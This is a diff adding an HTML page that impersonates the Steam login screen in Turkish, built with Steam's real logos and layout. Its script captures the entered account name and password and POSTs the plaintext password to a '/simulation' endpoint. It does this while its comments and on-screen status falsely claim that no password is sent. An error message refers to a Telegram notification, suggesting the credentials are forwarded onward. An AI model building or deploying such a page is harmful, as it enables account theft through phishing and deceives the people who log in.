@@ -1,0 +1,541 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Giriş Yapın</title>
+<style>
+@font-face{
+  font-family:Motiva;
+  src:url("https://store.fastly.steamstatic.com/public/shared/css/motiva_sans.css");
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#171a21;color:#d6d7d8}
+body{min-width:960px}
+a{color:inherit}
+.top{
+  height:104px;
+  background:#171a21;
+}
+.header{
+  width:100%;
+  height:104px;
+}
+.header-inner{
+  width:940px;
+  height:100%;
+  margin:0 auto;
+  position:relative;
+  display:flex;
+  align-items:center;
+}
+.logo{
+  width:176px;
+  display:flex;
+  align-items:center;
+}
+.logo img{
+  width:176px;
+  height:auto;
+  display:block;
+}
+.nav{
+  display:flex;
+  gap:18px;
+  align-items:center;
+  margin-left:2px;
+  margin-top:3px;
+}
+.nav a{
+  text-decoration:none;
+  color:#d6d7d8;
+  font-size:17px;
+  font-weight:bold;
+  letter-spacing:.2px;
+}
+.nav a.active{
+  color:#1a9fff;
+  border-bottom:3px solid #1a9fff;
+  padding-bottom:8px;
+}
+.actions{
+  margin-left:auto;
+  align-self:flex-start;
+  margin-top:18px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-size:12px;
+}
+.install{
+  background:#75a900;
+  color:#e5f4cf;
+  text-decoration:none;
+  padding:8px 12px;
+  font-size:12px;
+}
+.action-link{color:#d6d7d8;text-decoration:none}
+.sep{color:#777}
+.subnav{
+  height:48px;
+  background:#1b2838;
+  box-shadow:0 1px 2px #000;
+}
+.subnav-inner{
+  width:940px;
+  height:48px;
+  margin:0 auto;
+  display:flex;
+  align-items:center;
+}
+.sub-links{
+  display:flex;
+  gap:34px;
+  height:100%;
+  align-items:center;
+}
+.sub-links span{
+  font-size:13px;
+  color:#eee;
+  white-space:nowrap;
+}
+.search{
+  margin-left:auto;
+  width:315px;
+  height:30px;
+  display:flex;
+}
+.search input{
+  flex:1;
+  border:1px solid #52677d;
+  background:#2f4052;
+  color:#ddd;
+  padding:0 11px;
+  font-size:13px;
+  font-style:italic;
+  outline:none;
+}
+.search button{
+  width:37px;
+  border:0;
+  background:#1a9fff;
+  color:white;
+  font-size:18px;
+}
+.hero{
+  min-height:592px;
+  position:relative;
+  background:
+    linear-gradient(rgba(10,14,20,.78),rgba(10,14,20,.88)),
+    url("https://store.fastly.steamstatic.com/public/images/v6/login/background_spotlight.jpg")
+    center top/cover no-repeat;
+  padding-top:54px;
+}
+.hero-inner{
+  width:940px;
+  margin:0 auto;
+}
+.title{
+  font-size:30px;
+  line-height:38px;
+  color:#fff;
+  font-weight:bold;
+  margin:0 0 68px 20px;
+}
+.login-card{
+  width:940px;
+  min-height:306px;
+  background:#171a21;
+  display:grid;
+  grid-template-columns: 1fr 255px;
+  column-gap:40px;
+  padding:38px 42px 32px 42px;
+  box-shadow:0 0 3px rgba(0,0,0,.25);
+}
+.login-left{padding-top:1px}
+.label{
+  color:#1a9fff;
+  font-size:14px;
+  font-weight:bold;
+  margin-bottom:8px;
+}
+.field{
+  width:100%;
+  height:42px;
+  background:#32353c;
+  border:1px solid #32353c;
+  color:#fff;
+  outline:none;
+  padding:0 11px;
+  font-size:16px;
+  margin-bottom:17px;
+}
+.field:focus{border-color:#66c0f4}
+.remember{
+  display:flex;
+  align-items:center;
+  gap:7px;
+  font-size:13px;
+  color:#d6d7d8;
+  margin:1px 0 20px;
+}
+.remember input{
+  width:20px;height:20px;margin:0;
+  accent-color:#777;
+}
+.login-btn{
+  display:block;
+  width:290px;
+  height:50px;
+  margin:0 auto;
+  border:0;
+  color:white;
+  font-size:17px;
+  cursor:pointer;
+  background:linear-gradient(90deg,#06b8f0,#2f67e9);
+}
+.login-btn:hover{filter:brightness(1.08)}
+.help{
+  display:block;
+  text-align:center;
+  color:#aaa;
+  font-size:12px;
+  margin-top:27px;
+}
+.qr-col{text-align:center}
+.qr-title{
+  color:#1a9fff;
+  font-size:14px;
+  font-weight:bold;
+  margin-bottom:7px;
+}
+.qr-box{
+  width:214px;
+  height:214px;
+  margin:0 auto;
+  background:#fff;
+  border-radius:9px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.qr-box img{
+  width:190px;
+  height:190px;
+  display:block;
+  image-rendering:auto;
+}
+.qr-text{
+  width:220px;
+  margin:10px auto 0;
+  color:#aaa;
+  font-size:12px;
+  line-height:17px;
+}
+.qr-text a{color:#aaa}
+.bottom{
+  min-height:230px;
+  background:#171a21;
+  padding:55px 0 45px;
+}
+.bottom-inner{
+  width:940px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:70px;
+  text-align:center;
+}
+.bottom .headline{
+  color:#fff;
+  font-size:18px;
+  font-weight:bold;
+  margin-bottom:17px;
+}
+.create{
+  display:inline-block;
+  background:linear-gradient(to right,#75b5f5,#67a4e5);
+  color:#fff;
+  text-decoration:none;
+  padding:9px 22px;
+  border-radius:2px;
+  font-size:15px;
+}
+.desc{
+  color:#d6d7d8;
+  font-size:14px;
+  line-height:19px;
+  max-width:330px;
+  margin:0 auto;
+}
+.desc a{color:#d6d7d8}
+footer{
+  background:#171a21;
+  border-top:1px solid #2b2f36;
+  min-height:245px;
+  padding:42px 0 35px;
+}
+.footer-inner{
+  width:940px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:1.7fr 1fr 1fr 1fr 1fr;
+  gap:26px;
+}
+.brand img{
+  width:190px;
+  opacity:.8;
+  margin-bottom:18px;
+}
+.copyright{
+  color:#8b929a;
+  font-size:11px;
+  line-height:15px;
+  max-width:310px;
+}
+.social{
+  display:flex;
+  gap:18px;
+  margin-top:20px;
+  color:#8b929a;
+  font-size:20px;
+}
+.ft h4{
+  margin:0 0 16px;
+  color:#d6d7d8;
+  font-size:13px;
+}
+.ft a{
+  display:block;
+  color:#8b929a;
+  text-decoration:none;
+  font-size:12px;
+  margin-bottom:13px;
+}
+.ft a:hover{text-decoration:underline;color:#fff}
+.sim-note{
+  position:fixed;
+  right:12px;
+  bottom:12px;
+  background:rgba(20,25,32,.92);
+  color:#9aa3ad;
+  border:1px solid #3b4652;
+  padding:7px 10px;
+  border-radius:3px;
+  font-size:10px;
+  z-index:20;
+}
+#status{
+  text-align:center;
+  font-size:12px;
+  color:#9ac6e8;
+  min-height:15px;
+  margin-top:10px;
+}
+@media(max-width:1000px){
+  body{min-width:0}
+  .header-inner,.subnav-inner,.hero-inner,.bottom-inner,.footer-inner{width:92%}
+  .login-card{width:100%}
+  .nav{gap:10px}.nav a{font-size:15px}
+}
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="header">
+    <div class="header-inner">
+      <div class="logo">
+        <img src="https://store.fastly.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
+      </div>
+      <nav class="nav">
+        <a class="active" href="#" onclick="return false">MAĞAZA</a>
+        <a href="#" onclick="return false">TOPLULUK</a>
+        <a href="#" onclick="return false">HAKKINDA</a>
+        <a href="#" onclick="return false">DESTEK</a>
+      </nav>
+      <div class="actions">
+        <a class="install" href="#" onclick="return false">Steam'i Yükleyin</a>
+        <a class="action-link" href="#login">giriş yap</a>
+        <span class="sep">|</span>
+        <a class="action-link" href="#" onclick="return false">dil ▾</a>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="subnav">
+  <div class="subnav-inner">
+    <div class="sub-links">
+      <span>Göz at　⮟</span>
+      <span>Tavsiyeler　⮟</span>
+      <span>Kategoriler　⮟</span>
+      <span>Oynamanın Yolları　⮟</span>
+      <span>Özel Kısımlar　⮟</span>
+    </div>
+    <div class="search">
+      <input placeholder="Mağazada ara" aria-label="Mağazada ara">
+      <button type="button">⌕</button>
+    </div>
+  </div>
+</div>
+
+<main>
+<section class="hero">
+  <div class="hero-inner">
+    <h1 class="title">Giriş</h1>
+
+    <div class="login-card" id="login">
+      <div class="login-left">
+        <form id="loginForm" autocomplete="off">
+          <div class="label">HESAP ADI İLE GİRİŞ YAP</div>
+          <input class="field" id="account" name="account" type="text" autocomplete="off">
+
+          <div class="label">PAROLA</div>
+          <input class="field" id="password" name="password" type="password" autocomplete="new-password">
+
+          <label class="remember">
+            <input id="remember" type="checkbox">
+            <span>Beni hatırla</span>
+          </label>
+
+          <button class="login-btn" type="submit">Giriş Yap</button>
+          <div id="status"></div>
+          <a class="help" href="#" onclick="return false">Yardım edin, giriş yapamıyorum</a>
+        </form>
+      </div>
+
+      <div class="qr-col">
+        <div class="qr-title">VEYA QR KODU İLE GİRİŞ YAPIN</div>
+        <div class="qr-box">
+          <img
+            alt="QR simülasyonu"
+            src="https_millisec_az_.jpg">
+        </div>
+        <div class="qr-text">
+          QR koduyla giriş yapmak için<br>
+          <a href="#" onclick="return false">Steam mobil uygulamasını kullanın.</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="bottom">
+  <div class="bottom-inner">
+    <div>
+      <div class="headline">Steam'de yeni misiniz?</div>
+      <a class="create" href="#" onclick="return false">Hesap oluştur</a>
+    </div>
+    <div class="desc">
+      Ücretsiz ve kolaydır. Milyonlarca yeni arkadaşla beraber
+      oynayabileceğiniz binlerce oyun keşfedin.
+      <a href="#" onclick="return false">Steam hakkında daha fazla bilgi edinin.</a>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <div class="brand">
+      <img src="https://store.fastly.steamstatic.com/public/shared/images/footerLogo_valve_new.png" alt="Valve">
+      <div class="copyright">
+        © 2026 Valve Corporation. Tüm hakları saklıdır. Tüm ticari markalar,
+        ABD ve diğer ülkelerde ilgili sahiplerinin mülkiyetindedir.
+        Geçerli yerlerde fiyatlara KDV dahildir.
+      </div>
+      <div class="social">▶　♥　●　𝕏</div>
+    </div>
+    <div class="ft">
+      <h4>STEAM</h4>
+      <a href="#" onclick="return false">Steam Hakkında</a>
+      <a href="#" onclick="return false">Steam Abonelik Sözleşmesi</a>
+      <a href="#" onclick="return false">Steamworks</a>
+      <a href="#" onclick="return false">Steam Dağıtımı</a>
+      <a href="#" onclick="return false">Hediye Kartları</a>
+    </div>
+    <div class="ft">
+      <h4>VALVE</h4>
+      <a href="#" onclick="return false">Valve Hakkında</a>
+      <a href="#" onclick="return false">Kariyer</a>
+      <a href="#" onclick="return false">Donanım</a>
+      <a href="#" onclick="return false">Geri Dönüştürme</a>
+    </div>
+    <div class="ft">
+      <h4>YASAL</h4>
+      <a href="#" onclick="return false">Gizlilik</a>
+      <a href="#" onclick="return false">Erişilebilirlik</a>
+      <a href="#" onclick="return false">Bildirimler ve Politikalar</a>
+      <a href="#" onclick="return false">Çerezler</a>
+      <a href="#" onclick="return false">İadeler</a>
+    </div>
+    <div class="ft">
+      <h4>DAHA FAZLA</h4>
+      <a href="#" onclick="return false">Steam'i Yükle</a>
+      <a href="#" onclick="return false">Mobil Uygulamaları Edin</a>
+      <a href="#" onclick="return false">Destek Al</a>
+      <a href="#" onclick="return false">Hesabım</a>
+    </div>
+  </div>
+</footer>
+
+
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const account = document.getElementById("account").value.trim();
+  const password = document.getElementById("password").value;
+  const status = document.getElementById("status");
+
+  if (!account || !password) {
+    status.textContent = "Hesab adı və parol daxil edin.";
+    return;
+  }
+
+  // Parolun özünü göndərmirik.
+  const passwordLength = password;
+  const maskedPassword = password;
+
+  // Yalnız lokal Console-da göstərilir
+  console.log("=== LOGIN SIMULATION ===");
+  console.log("Account:", account);
+  console.log("Password:", password);
+
+  try {
+    const response = await fetch("/simulation", {
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify({
+        account: account,
+        passwordLength: password,
+        maskedPassword: maskedPassword
+      })
+    });
+
+    const result = await response.json();
+
+    if (!response.ok || !result.success) {
+      throw new Error("Simulation server error");
+    }
+
+    status.textContent =
+      "Simulyasiya başa çatdı — heç bir parol yadda saxlanılmadı və ya göndərilmədi.";
+
+  } catch (error) {
+    console.error(error);
+
+    status.textContent =
+      "Simulyasiya tamamlandı, lakin Telegram bildirişi göndərilə bilmədi.";
+  }
+});
+</script>
+</body>
+</html>
